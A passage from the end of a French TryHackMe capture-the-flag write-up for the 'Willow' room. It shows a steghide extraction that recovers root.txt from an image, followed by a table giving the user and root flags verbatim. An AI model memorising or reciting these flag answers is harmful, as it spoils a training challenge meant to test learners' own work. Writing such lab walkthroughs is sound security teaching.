    encrypted: rijndael-128, cbc
    compressed: yes
                                                                                                                       
┌──(kali㉿kali)-[~/THM/willow]
└─$ steghide extract -sf user.jpg                                       
Enter passphrase: 
wrote extracted data to "root.txt".                                                                                                                 
```

Contenu de root.txt

```
┌──(kali㉿kali)-[~/THM/willow]
└─$ cat root.txt
THM{find_a_red_rose_on_the_grave}
```

_<mark style="color:orange;">**And this complete the vote of the Belgian jury**</mark>_ ☺️✌️

## \[Task 5] Réponses aux questions



<table><thead><tr><th width="281">Question</th><th>Réponse</th></tr></thead><tbody><tr><td>User Flag:</td><td><pre><code>THM{beneath_the_weeping_willow_tree}
</code></pre></td></tr><tr><td>Root Flag:</td><td><pre><code>THM{find_a_red_rose_on_the_grave}
</code></pre></td></tr></tbody></table>
